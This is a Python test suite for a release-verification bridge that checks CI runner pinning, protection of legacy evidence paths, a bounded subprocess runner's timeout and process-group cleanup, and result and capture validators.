        for workflow, expected in PINS.EXPECTED_RUNNERS.items():
            text = (ROOT / ".github/workflows" / workflow).read_text()
            self.assertEqual(
                Counter(PINS.RUNS_ON_LINE.findall(text)),
                expected,
            )
            self.assertFalse(
                any(
                    label.endswith("-latest")
                    for label in PINS.RUNS_ON_LINE.findall(text)
                )
            )

    def test_gate_does_not_execute_legacy_verifier(self) -> None:
        text = (ROOT / BRIDGE.GATE_PATH).read_text()
        self.assertNotIn("verify-current-audit.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0010.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0011.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0012.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0013.py", text)
        self.assertIn("verify-framework-recovery-fr-0014.py", text)

    def test_new_root_never_imports_fr0010_through_fr0013_python(self) -> None:
        legacy_modules = (
            "framework_recovery_fr_0010",
            "framework_recovery_fr_0011",
            "framework_recovery_fr_0012",
            "verify-framework-recovery-fr-0010",
            "verify-framework-recovery-fr-0011",
            "verify-framework-recovery-fr-0012",
            "framework_recovery_fr_0013",
            "verify-framework-recovery-fr-0013",
        )
        for relative in (
            BRIDGE.MODULE_PATH,
            BRIDGE.CAPTURE_PATH,
            BRIDGE.RESULT_PATH,
            BRIDGE.BRIDGE_PATH,
        ):
            source = (ROOT / relative).read_text()
            for module in legacy_modules:
                with self.subTest(relative=relative, module=module):
                    self.assertNotIn(f"import {module}", source)
                    self.assertNotIn(f"from {module}", source)

    def test_legacy_boundary_does_not_import_historical_python(self) -> None:
        with mock.patch.object(
            BRIDGE.importlib.util,
            "spec_from_file_location",
            side_effect=AssertionError("historical Python import attempted"),
        ):
            BRIDGE._verify_legacy_boundary(ROOT)

    def test_legacy_boundary_does_not_execute_historical_python(self) -> None:
        historical_paths = {
            "tools/release/verify-framework-recovery-fr-0010.py",
            "tools/release/verify-framework-recovery-fr-0011.py",
            "tools/release/verify-framework-recovery-fr-0012.py",
            "tools/release/verify-framework-recovery-fr-0013.py",
            "tools/release/framework_recovery_fr_0010.py",
            "tools/release/framework_recovery_fr_0011.py",
            "tools/release/framework_recovery_fr_0012.py",
            "tools/release/framework_recovery_fr_0013.py",
        }
        real_run = subprocess.run

        def guarded_run(*arguments: Any, **keywords: Any) -> Any:
            command = arguments[0]
            executable = Path(command[0]).name
            if executable.startswith("python") and historical_paths.intersection(
                command[1:]
            ):
                raise AssertionError("historical Python execution attempted")
            return real_run(*arguments, **keywords)

        with mock.patch.object(BRIDGE.subprocess, "run", side_effect=guarded_run):
            BRIDGE._verify_legacy_boundary(ROOT)

    def test_reserved_legacy_completion_paths_are_protected(self) -> None:
        reserved = (
            BRIDGE.FR0010_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0011_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0012_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0013_FORBIDDEN_COMPLETION_PATHS
        )
        self.assertTrue(reserved)
        self.assertTrue(reserved <= BRIDGE.PROTECTED_AFTER_ACTIVATION)
        self.assertIn(
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0011-qualification.json"
            ),
            reserved,
        )
        expected_fr0012 = {
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0012-qualification.json"
            ),
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0012-activation.json"
            ),
            *{
                (
                    "release/0.9.0/current-head/evidence/"
                    f"framework-recovery-fr-0012-{suffix}.json"
                )
                for suffix in (
                    "r-ci-capture",
                    "r-ci-result",
                    "r-ci-attestation",
                    "r-formal-capture",
                    "r-formal-result",
                    "r-formal-attestation",
                    "r-local",
                    "q-ci-capture",
                    "q-ci-result",
                    "q-ci-attestation",
                    "q-formal-capture",
                    "q-formal-result",
                    "q-formal-attestation",
                    "branch-protection",
                )
            },
        }
        self.assertEqual(
            BRIDGE.FR0012_FORBIDDEN_COMPLETION_PATHS,
            expected_fr0012,
        )
        expected_fr0013 = {
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0013-activation.json"
            ),
            *{
                (
                    "release/0.9.0/current-head/evidence/"
                    f"framework-recovery-fr-0013-{suffix}.json"
                )
                for suffix in (
                    "q-ci-capture",
                    "q-ci-result",
                    "q-ci-attestation",
                    "q-formal-capture",
                    "q-formal-result",
                    "q-formal-attestation",
                    "branch-protection",
                )
            },
        }
        self.assertEqual(
            BRIDGE.FR0013_FORBIDDEN_COMPLETION_PATHS,
            expected_fr0013,
        )

    def test_recovery_namespace_variants_are_protected(self) -> None:
        forbidden = (
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0012-qualification-forged.json"
            ),
            (
                "release/0.9.0/current-head/closures/Framework-Recovery/"
                "alternate-name.json"
            ),
            (
                "release/0.9.0/current-head/evidence/"
                "framework-recovery-fr-0012-r-local.json.bak"
            ),
            (
                "release/0.9.0/current-head/reviews/"
                "FRAMEWORK-RECOVERY-FR-0010-shadow.json"
            ),
        )
        for path in forbidden:
            with self.subTest(path=path):
                self.assertTrue(BRIDGE._successor_path_protected(path))
        permitted = (
            "release/0.9.0/current-head/requirements.json",
            "release/0.9.0/current-head/evidence/tasks/ch-t001/e0003.json",
            "crates/haldir-core/src/lib.rs",
        )
        for path in permitted:
            with self.subTest(path=path):
                self.assertFalse(BRIDGE._successor_path_protected(path))


class BoundedProcessTests(unittest.TestCase):
    def environment(self) -> dict[str, str]:
        return {
            "LC_ALL": "C",
            "PATH": f"{Path(sys.executable).parent}:/usr/bin:/bin",
        }

    def run_python(
        self,
        source: str,
        *,
        timeout: float = 2,
        limit: int = 4096,
    ) -> tuple[int, bytes, bytes]:
        return BRIDGE._run_bounded(
            (sys.executable, "-I", "-B", "-W", "error", "-c", source),
            cwd=ROOT,
            env=self.environment(),
            timeout_seconds=timeout,
            output_limit=limit,
        )

    def assert_pid_dead(self, pid: int) -> None:
        deadline = time.monotonic() + 2
        while time.monotonic() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                return
            proc_stat = Path(f"/proc/{pid}/stat")
            try:
                if proc_stat.is_file() and proc_stat.read_text().split()[2] == "Z":
                    return
            except (FileNotFoundError, ProcessLookupError):
                return
            time.sleep(0.02)
        self.fail(f"process {pid} survived bounded cleanup")

    def assert_no_live_process_group(self, pgid: int) -> None:
        deadline = time.monotonic() + 2
        proc_root = Path("/proc")
        while time.monotonic() < deadline:
            if proc_root.is_dir():
                live_members: list[int] = []
                for candidate in proc_root.iterdir():
                    if not candidate.name.isdigit():
                        continue
                    try:
                        raw = (candidate / "stat").read_text()
                        fields = raw[raw.rindex(")") + 2 :].split()
                        state = fields[0]
                        member_pgid = int(fields[2])
                    except (
                        FileNotFoundError,
                        ProcessLookupError,
                        IndexError,
                        ValueError,
                    ):
                        continue
                    if member_pgid == pgid and state != "Z":
                        live_members.append(int(candidate.name))
                if not live_members:
                    return
            else:
                try:
                    os.killpg(pgid, 0)
                except (ProcessLookupError, PermissionError):
                    return
            time.sleep(0.02)
        self.fail(f"process group {pgid} retained a live member")

    def test_proc_stat_disappearance_is_a_dead_process(self) -> None:
        for exception in (FileNotFoundError, ProcessLookupError):
            with (
                self.subTest(exception=exception.__name__),
                mock.patch.object(os, "kill", return_value=None),
                mock.patch.object(Path, "is_file", return_value=True),
                mock.patch.object(Path, "read_text", side_effect=exception),
            ):
                self.assert_pid_dead(424_242)

    def test_proc_group_scan_skips_disappearing_stat(self) -> None:
        for exception in (FileNotFoundError, ProcessLookupError):
            with (
                self.subTest(exception=exception.__name__),
                mock.patch.object(Path, "is_dir", return_value=True),
                mock.patch.object(
                    Path,
                    "iterdir",
                    return_value=iter((Path("/proc/424242"),)),
                ),
                mock.patch.object(Path, "read_text", side_effect=exception),
            ):
                self.assert_no_live_process_group(424_242)

    @contextmanager
    def capture_processes(
        self,
    ) -> Iterator[list[subprocess.Popen[bytes]]]:
        real_popen = subprocess.Popen
        captured: list[subprocess.Popen[bytes]] = []

        def recording_popen(
            *arguments: Any,
            **keywords: Any,
        ) -> subprocess.Popen[bytes]:
            process = real_popen(*arguments, **keywords)
            captured.append(process)
            return process

        try:
            with mock.patch.object(
                BRIDGE.subprocess,
                "Popen",
                side_effect=recording_popen,
            ):
                yield captured
        finally:
            for process in captured:
                if process.returncode is None:
                    try:
                        os.killpg(process.pid, signal.SIGKILL)
                    except (OSError, ProcessLookupError):
                        pass
                    try:
                        process.kill()
                    except (OSError, ProcessLookupError):
                        pass
                    try:
                        process.wait(timeout=5)
                    except (OSError, subprocess.TimeoutExpired):
                        pass
                for pipe in (process.stdout, process.stderr):
                    if pipe is not None:
                        pipe.close()

    def assert_process_cleaned(
        self,
        process: subprocess.Popen[bytes],
    ) -> None:
        self.assertIsNotNone(process.returncode)
        self.assertIsNotNone(process.stdout)
        self.assertIsNotNone(process.stderr)
        assert process.stdout is not None
        assert process.stderr is not None
        self.assertTrue(process.stdout.closed)
        self.assertTrue(process.stderr.closed)

    def test_success_and_nonzero_are_returned_exactly(self) -> None:
        result = self.run_python(
            "import sys;sys.stdout.buffer.write(b'out');sys.stderr.buffer.write(b'err')"
        )
        self.assertEqual(result, (0, b"out", b"err"))
        result = self.run_python("import sys;sys.exit(7)")
        self.assertEqual(result, (7, b"", b""))

    def test_exact_combined_limit_passes_and_first_extra_byte_fails(self) -> None:
        result = self.run_python(
            "import os;os.write(1,b'a'*2048);os.write(2,b'b'*2048)",
            limit=4096,
        )
        self.assertEqual(result[0], 0)
        self.assertEqual(len(result[1]) + len(result[2]), 4096)
        with self.assertRaisesRegex(BRIDGE.BridgeError, "OUTPUT_BOUND"):
            self.run_python(
                "import os;os.write(1,b'a'*2048);os.write(2,b'b'*2049)",
                limit=4096,
            )

    def test_concurrent_large_streams_do_not_deadlock_or_lose_bytes(self) -> None:
        unit = 4096
        repetitions = 64
        source = (
            "import os,threading\n"
            "def write_all(descriptor, byte):\n"
            f"    for _ in range({repetitions}):\n"
            f"        os.write(descriptor, byte*{unit})\n"
            "threads=(threading.Thread(target=write_all,args=(1,b'a')),"
            "threading.Thread(target=write_all,args=(2,b'b')))\n"
            "[thread.start() for thread in threads]\n"
            "[thread.join() for thread in threads]\n"
        )
        expected = unit * repetitions
        result = self.run_python(
            source,
            timeout=5,
            limit=expected * 2,
        )
        self.assertEqual(result, (0, b"a" * expected, b"b" * expected))

    def test_child_closing_pipes_then_sleeping_is_domain_timeout(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            pid_path = Path(name) / "leader.pid"
            source = (
                "import os,pathlib,time;"
                f"pathlib.Path({str(pid_path)!r}).write_text(str(os.getpid()));"
                "os.close(1);os.close(2);time.sleep(30)"
            )
            started = time.monotonic()
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_TIMEOUT"):
                self.run_python(source, timeout=0.5)
            self.assertLess(time.monotonic() - started, 2)
            self.assert_pid_dead(int(pid_path.read_text()))

    def test_descendant_holding_pipes_is_killed_as_a_group(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            process_path = Path(name) / "descendant.json"
            descendant = "import time;time.sleep(30)"
            source = (
                "import json,os,pathlib,subprocess,sys;"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{descendant!r}));"
                f"pathlib.Path({str(process_path)!r}).write_text(json.dumps("
                "{'pid':p.pid,'pgid':os.getpgid(p.pid),"
                "'leader_pgid':os.getpgrp()}));"
                "p.returncode=0"
            )
            result = self.run_python(source)
            self.assertEqual(result, (0, b"", b""))
            identity = json.loads(process_path.read_text())
            self.assertEqual(identity["pgid"], identity["leader_pgid"])
            self.assertGreater(identity["pgid"], 1)
            self.assert_pid_dead(identity["pid"])
            self.assert_no_live_process_group(identity["pgid"])

    def test_success_path_kills_same_group_descendant_before_reaping(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            pid_path = Path(name) / "descendant.pid"
            descendant = "import time;time.sleep(30)"
            source = (
                "import pathlib,subprocess,sys;"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{descendant!r}),"
                "stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);"
                f"pathlib.Path({str(pid_path)!r}).write_text(str(p.pid));"
                "p.returncode=0"
            )
            result = self.run_python(source)
            self.assertEqual(result, (0, b"", b""))
            self.assert_pid_dead(int(pid_path.read_text()))

    def test_setsid_escape_is_disclosed_cleanup_failure_not_containment(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as name:
            identity_path = Path(name) / "escaped.json"
            escaped = (
                "import json,os,pathlib,time;"
                "os.setsid();"
                f"pathlib.Path({str(identity_path)!r}).write_text(json.dumps("
                "{'pid':os.getpid(),'pgid':os.getpgrp(),"
                "'sid':os.getsid(0)}));"
                "time.sleep(30)"
            )
            source = (
                "import pathlib,subprocess,sys,time\n"
                f"path=pathlib.Path({str(identity_path)!r})\n"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{escaped!r}))\n"
                "deadline=time.monotonic()+2\n"
                "while not path.is_file() and time.monotonic()<deadline:\n"
                "    time.sleep(0.005)\n"
                "if not path.is_file():\n"
                "    raise RuntimeError('setsid fixture did not synchronize')\n"
                "p.returncode=0\n"
            )
            escaped_pid: int | None = None
            try:
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_CLEANUP",
                ):
                    self.run_python(source, timeout=5)
                identity = json.loads(identity_path.read_text())
                escaped_pid = identity["pid"]
                self.assertEqual(identity["pid"], identity["pgid"])
                self.assertEqual(identity["pid"], identity["sid"])
                os.kill(escaped_pid, 0)
            finally:
                if escaped_pid is None and identity_path.is_file():
                    escaped_pid = json.loads(identity_path.read_text())["pid"]
                if escaped_pid is not None:
                    try:
                        os.kill(escaped_pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                    self.assert_pid_dead(escaped_pid)

    def test_invalid_bounds_fail_before_selector_or_process_creation(self) -> None:
        invalid_timeouts = (
            True,
            "1",
            None,
            float("nan"),
            float("inf"),
            float("-inf"),
            0,
            -1,
        )
        for value in invalid_timeouts:
            with (
                self.subTest(timeout=value),
                mock.patch.object(BRIDGE.selectors, "DefaultSelector") as selector,
                mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_BOUND",
                ):
                    BRIDGE._run_bounded(
                        (sys.executable, "-c", "pass"),
                        cwd=ROOT,
                        env=self.environment(),
                        timeout_seconds=value,
                        output_limit=1,
                    )
                selector.assert_not_called()
                popen.assert_not_called()
        invalid_limits = (True, 1.0, "1", None, -1)
        for value in invalid_limits:
            with (
                self.subTest(limit=value),
                mock.patch.object(BRIDGE.selectors, "DefaultSelector") as selector,
                mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_BOUND",
                ):
                    BRIDGE._run_bounded(
                        (sys.executable, "-c", "pass"),
                        cwd=ROOT,
                        env=self.environment(),
                        timeout_seconds=1,
                        output_limit=value,
                    )
                selector.assert_not_called()
                popen.assert_not_called()

    def test_selector_construction_precedes_process_spawn(self) -> None:
        sentinel = OSError(24, "selector-construction")
        with (
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                side_effect=sentinel,
            ),
            mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("pass")
            popen.assert_not_called()

    def test_popen_failure_closes_preacquired_selector(self) -> None:
        selector = mock.Mock()
        with (
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
            mock.patch.object(
                BRIDGE.subprocess,
                "Popen",
                side_effect=OSError(24, "popen-failure"),
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("pass")
        selector.close.assert_called_once_with()

    def test_selector_and_read_exceptions_cleanup_every_resource(self) -> None:
        real_selector = BRIDGE.selectors.DefaultSelector()
        selector = mock.Mock(wraps=real_selector)
        selector.select.side_effect = OSError(5, "selector-failure")
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("import time;time.sleep(30)")
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        selector.close.assert_called_once_with()

        real_read = os.read
        with self.capture_processes() as processes:

            def fail_bridge_read(
                descriptor: int,
                size: int,
            ) -> bytes:
                if processes:
                    raise OSError(5, "read-failure")
                return real_read(descriptor, size)

            with mock.patch.object(
                BRIDGE.os,
                "read",
                side_effect=fail_bridge_read,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_CLEANUP",
                ):
                    self.run_python("import os,time;os.write(1,b'x');time.sleep(30)")
                self.assertEqual(len(processes), 1)
                self.assert_process_cleaned(processes[0])

    def test_cleanup_failure_has_a_distinct_domain_error(self) -> None:
        with (
            self.capture_processes() as processes,
            mock.patch.object(BRIDGE, "_kill_process_group", return_value=False),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE,
                "_close_pipe",
                return_value=False,
            ),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("pass")
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE,
                "_terminate_and_reap",
                side_effect=RuntimeError("injected-cleanup-failure"),
            ),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])

    def test_double_termination_failure_still_closes_selector_and_pipes(
        self,
    ) -> None:
        real_selector = BRIDGE.selectors.DefaultSelector()
        selector = mock.Mock(wraps=real_selector)
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
            mock.patch.object(
                BRIDGE,
                "_terminate_and_reap",
                side_effect=RuntimeError("primary-cleanup-failure"),
            ),
            mock.patch.object(
                BRIDGE,
                "_emergency_terminate_and_reap",
                side_effect=RuntimeError("emergency-cleanup-failure"),
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            process = processes[0]
            self.assertIsNone(process.returncode)
            self.assertIsNotNone(process.stdout)
            self.assertIsNotNone(process.stderr)
            assert process.stdout is not None
            assert process.stderr is not None
            self.assertTrue(process.stdout.closed)
            self.assertTrue(process.stderr.closed)
            selector.close.assert_called_once_with()

    def test_kill_lookup_race_and_wait_timeout_fallbacks(self) -> None:
        process = mock.Mock()
        process.pid = 424_242
        with mock.patch.object(
            BRIDGE.os,
            "killpg",
            side_effect=ProcessLookupError,
        ):
            self.assertTrue(BRIDGE._kill_process_group(process))

        first_timeout = mock.Mock()
        first_timeout.pid = 424_243
        first_timeout.wait.side_effect = (
            subprocess.TimeoutExpired(("fixture",), 5),
            0,
        )
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                return_value=False,
            ),
            mock.patch.object(
                BRIDGE,
                "_kill_process_group",
                return_value=True,
            ) as kill_group,
        ):
            self.assertTrue(BRIDGE._terminate_and_reap(first_timeout))
        self.assertEqual(first_timeout.wait.call_count, 2)
        first_timeout.kill.assert_called_once_with()
        self.assertEqual(kill_group.call_count, 2)

        double_timeout = mock.Mock()
        double_timeout.pid = 424_244
        double_timeout.wait.side_effect = subprocess.TimeoutExpired(
            ("fixture",),
            5,
        )
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                return_value=False,
            ),
            mock.patch.object(
                BRIDGE,
                "_kill_process_group",
                return_value=True,
            ),
        ):
            self.assertFalse(BRIDGE._terminate_and_reap(double_timeout))
        self.assertEqual(double_timeout.wait.call_count, 2)
        double_timeout.kill.assert_called_once_with()

    def test_identity_loss_forbids_post_reap_signaling(self) -> None:
        initial_loss = mock.Mock()
        initial_loss.pid = 424_245
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                side_effect=ChildProcessError("identity released"),
            ),
            mock.patch.object(BRIDGE, "_kill_process_group") as kill_group,
        ):
            self.assertFalse(BRIDGE._terminate_and_reap(initial_loss))
        kill_group.assert_not_called()
        initial_loss.kill.assert_not_called()
        initial_loss.wait.assert_not_called()

        for error in (
            ChildProcessError("identity released"),
            OSError(5, "wait failure"),
        ):
            process = mock.Mock()
            process.pid = 424_246
            process.wait.side_effect = error
            with (
                self.subTest(error=type(error).__name__),
                mock.patch.object(
                    BRIDGE,
                    "_leader_exited_unreaped",
                    return_value=False,
                ),
                mock.patch.object(
                    BRIDGE,
                    "_kill_process_group",
                    return_value=True,
                ) as kill_group,
            ):
                self.assertFalse(BRIDGE._terminate_and_reap(process))
            kill_group.assert_called_once_with(
                process,
                zombie_leader=False,
            )
            process.kill.assert_not_called()
            process.wait.assert_called_once_with(timeout=5)

    def test_emergency_cleanup_requires_retained_identity_before_signals(
        self,
    ) -> None:
        for error in (
            ChildProcessError("identity released"),
            OSError(5, "waitid failure"),
        ):
            process = mock.Mock()
            process.pid = 424_247
            with (
                self.subTest(error=type(error).__name__),
                mock.patch.object(
                    BRIDGE.os,
                    "waitid",
                    side_effect=error,
                ),
                mock.patch.object(BRIDGE.os, "killpg") as kill_group,
            ):
                self.assertFalse(BRIDGE._emergency_terminate_and_reap(process))
            kill_group.assert_not_called()
            process.kill.assert_not_called()
            process.wait.assert_not_called()

        process = mock.Mock()
        process.pid = 424_248
        with (
            mock.patch.object(
                BRIDGE.os,
                "waitid",
                side_effect=(None, ChildProcessError("identity released")),
            ),
            mock.patch.object(BRIDGE.os, "killpg") as kill_group,
        ):
            self.assertFalse(BRIDGE._emergency_terminate_and_reap(process))
        kill_group.assert_called_once_with(process.pid, signal.SIGKILL)
        process.kill.assert_not_called()
        process.wait.assert_not_called()

    def test_no_resource_warning_or_unraisable_after_all_exit_paths(self) -> None:
        unraisable: list[object] = []
        previous = sys.unraisablehook
        sys.unraisablehook = unraisable.append
        try:
            with warnings.catch_warnings(record=True) as observed:
                warnings.simplefilter("always", ResourceWarning)
                self.run_python("pass")
                with self.assertRaises(BRIDGE.BridgeError):
                    self.run_python(
                        "import os;os.write(1,b'x'*2)",
                        limit=1,
                    )
                with self.assertRaises(BRIDGE.BridgeError):
                    self.run_python("import time;time.sleep(5)", timeout=0.1)
                gc.collect()
            resources = [
                item for item in observed if issubclass(item.category, ResourceWarning)
            ]
            self.assertEqual(resources, [])
            self.assertEqual(unraisable, [])
        finally:
            sys.unraisablehook = previous


class ResultEmitterTests(unittest.TestCase):
    def make_repo(self, root: Path) -> tuple[Path, str]:
        subprocess.run(["/usr/bin/git", "init", "-q", root], check=True)
        for contract in RESULT.WORKFLOW_CONTRACT.values():
            for relative in contract["materials"]:
                path = root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(relative + "\n")
        subprocess.run(
            ["/usr/bin/git", "-C", root, "add", "."],
            check=True,
        )
        environment = {
            **os.environ,
            "GIT_AUTHOR_NAME": "Test",
            "GIT_AUTHOR_EMAIL": "test@example.invalid",
            "GIT_COMMITTER_NAME": "Test",
            "GIT_COMMITTER_EMAIL": "test@example.invalid",
        }
        subprocess.run(
            ["/usr/bin/git", "-C", root, "commit", "-q", "-m", "fixture"],
            check=True,
            env=environment,
        )
        commit = (
            subprocess.check_output(["/usr/bin/git", "-C", root, "rev-parse", "HEAD"])
            .decode()
            .strip()
        )
        return root, commit

    def environment(self, commit: str, attempt: int = 2) -> dict[str, str]:
        return {
            "GITHUB_ACTIONS": "true",
            "GITHUB_REPOSITORY": "sepahead/haldir",
            "GITHUB_REPOSITORY_ID": str(PROTOCOL.REPOSITORY_ID),
            "GITHUB_REPOSITORY_OWNER_ID": str(PROTOCOL.REPOSITORY_OWNER_ID),
            "GITHUB_WORKFLOW": "ci",
            "GITHUB_JOB": "supply-chain",
            "GITHUB_SHA": commit,
            "GITHUB_REF": "refs/heads/main",
            "GITHUB_WORKFLOW_REF": (
                "sepahead/haldir/.github/workflows/ci.yml@refs/heads/main"
            ),
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_RUN_ID": str(RUN_ID),
            "GITHUB_RUN_ATTEMPT": str(attempt),
            "GITHUB_RUN_NUMBER": str(RUN_NUMBER),
        }

    def test_attempt_two_emission(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            value = RESULT.build_result(
                repo, workflow="ci", environment=self.environment(commit)
            )
            self.assertEqual(value["execution"]["run_attempt"], 2)

    def test_attempt_nine_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            with self.assertRaisesRegex(RuntimeError, "RUN_ATTEMPT"):
                RESULT.build_result(
                    repo,
                    workflow="ci",
                    environment=self.environment(commit, attempt=9),
                )

    def test_output_traversal_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            with changed_directory(Path(name)):
                with self.assertRaisesRegex(RuntimeError, "RESULT_OUTPUT"):
                    RESULT._write_exclusive(
                        Path("../escape.json"),
                        b"{}\n",
                        expected_name="expected.json",
                    )


class CapturePrimitiveTests(unittest.TestCase):
    def test_repository_capture_rejects_raw_fork_ancestry_keys(self) -> None:
        document = {
            "id": BRIDGE.REPOSITORY_ID,
            "name": BRIDGE.REPOSITORY_NAME,
            "full_name": BRIDGE.REPOSITORY_FULL_NAME,
            "default_branch": BRIDGE.REPOSITORY_DEFAULT_BRANCH,
            "fork": False,
            "owner": {
                "id": BRIDGE.MAIN_RULESET_OWNER_ID,
                "login": BRIDGE.REPOSITORY_OWNER_LOGIN,
                "type": "User",
            },
        }
        self.assertEqual(
            CAPTURE._normalize_repository_document(document, BRIDGE),
            repository_identity(),
        )
        for field in ("parent", "source"):
            mutated = copy.deepcopy(document)
            mutated[field] = None
            with (
                self.subTest(field=field),
                self.assertRaisesRegex(
                    RuntimeError,
                    "CAPTURE_REPOSITORY_IDENTITY",
                ),
            ):
                CAPTURE._normalize_repository_document(mutated, BRIDGE)

    def test_blob_record_matches_git_object_format(self) -> None:
        value = CAPTURE._blob_record("evidence.json", b"{}\n")
        completed = subprocess.run(
            ["/usr/bin/git", "hash-object", "--stdin"],
            input=b"{}\n",
            stdout=subprocess.PIPE,
            check=True,
        )
        self.assertEqual(value["git_object_id"], completed.stdout.decode().strip())

    def test_epoch15_field_contracts(self) -> None:
        self.assertEqual(
            CAPTURE._run_fields(epoch15=True, attempt=False),
            (
                "attempt,conclusion,createdAt,databaseId,event,headBranch,"
                "headSha,jobs,number,status,updatedAt,url,workflowDatabaseId,"
                "workflowName"
            ),
        )
        self.assertIn(
            "startedAt",
            CAPTURE._run_fields(epoch15=True, attempt=True),
        )

    def test_local_check_numeric_fields_reject_bool_and_float(self) -> None:
        check = {
            "argv": ["/usr/bin/true"],
            "returncode": 0,
            "stderr_bytes": 0,
            "stderr_sha256": hashlib.sha256(b"").hexdigest(),
            "stdout_bytes": 0,
            "stdout_sha256": hashlib.sha256(b"").hexdigest(),
            "result": "PASS",
        }
        BRIDGE._validate_local_check(check)
        for field, invalid in (
            ("returncode", False),
            ("returncode", 0.0),
            ("stdout_bytes", False),
            ("stdout_bytes", 0.0),
            ("stderr_bytes", False),
            ("stderr_bytes", 0.0),
        ):
            mutated = copy.deepcopy(check)
            mutated[field] = invalid
            with (
                self.subTest(field=field, invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "LOCAL_CHECK"),
            ):
                BRIDGE._validate_local_check(mutated)

    def test_capture_and_bridge_share_exact_listing_validator(self) -> None:
        capture_source = (ROOT / BRIDGE.CAPTURE_PATH).read_text()
        bridge_source = (ROOT / BRIDGE.BRIDGE_PATH).read_text()
        self.assertIn("protocol.validate_artifact_listing(listing)", capture_source)
        self.assertIn("protocol.validate_artifact_listing(listing)", bridge_source)


if __name__ == "__main__":
    unittest.main(verbosity=2)
